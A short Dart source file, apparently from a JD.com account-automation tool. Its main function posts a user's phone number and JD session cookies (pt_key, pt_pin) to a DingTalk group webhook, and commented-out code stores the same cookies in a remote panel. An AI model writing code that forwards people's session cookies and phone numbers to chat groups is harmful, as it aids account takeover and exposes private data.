import 'dart:convert' as convert;
import 'dart:convert';
import 'dart:io';
import 'package:dio/dio.dart';
import 'package:http/http.dart' as http;
import 'package:crypto/crypto.dart';

//钉钉Webhook地址
String DingdingWebhook = 'https://oapi.dingtalk.com/robot/send?access_token=xxx';
//钉钉机器人Secret
String DingdingSecret = '';

// String apiurl = 'https://api.do.to/api';
// String client_id = '';
// String client_secret = '';
//
// // 获取token
// Future<String> getToken() async{
//   var url = Uri.parse(apiurl+'/auth/token?client_id=${client_id}&client_secret=${client_secret}');
//   var response = await http.get(url);
//   print('Response status: ${response.statusCode}');
//   print('Response body: ${response.body}');
//   if (response.statusCode == 200) {
//     var json = convert.jsonDecode(response.body) as Map<String, dynamic>;
//     if(json['code'] == 200){
//       return json['data']['token'];
//     }else{
//       return '10000';
//     }
//   } else {
//     return '10000';
//   }
// }

// 添加环境变量
// Future<String> addEnv({required String token,required String pt_key,required String pt_pin,required String phone}) async{
//   var url = Uri.parse(apiurl+'/envs');
//   print("令牌" + token);
//   var response = await http.post(url, headers:{HttpHeaders.authorizationHeader:'Bearer ${token}'},body:"{'value':'pt_key=${pt_key};pt_pin=${pt_pin}','name':'JD_COOKIE','remarks':'${phone}'}");
//   print('Response status: ${response.statusCode}');
//   print('Response body: ${response.body}');
//   return '10000';
// }

String sign() {
  int timeStamp = DateTime.now().millisecondsSinceEpoch;
  String stringToSign =  timeStamp.toString() + "\n" + DingdingSecret;
  var key = utf8.encode(DingdingSecret);
  var bytes = utf8.encode(stringToSign);
  var hmacSha256 = new Hmac(sha256, key);
  var digest = hmacSha256.convert(bytes);
  var signBase64 = base64.encode(digest.bytes).toString();
  return "&timestamp=" + timeStamp.toString() + "&sign="+Uri.encodeComponent(signBase64);
}

// 发送token到钉钉群
Future<void> sendDingDing(String phone, String pt_key, String pt_pin) async{
  Uri url = Uri.parse(DingdingWebhook+sign());
  http.Response response = await http.post(url, headers: {'content-type':'application/json'}, body: '{"msgtype": "text","text": {"content":"新增账号\n${phone}\nJD_COOKIE\n${pt_key};${pt_pin};"}}');
  print('Response status: ${response.statusCode}');
  print('Response body: ${response.body}');
}

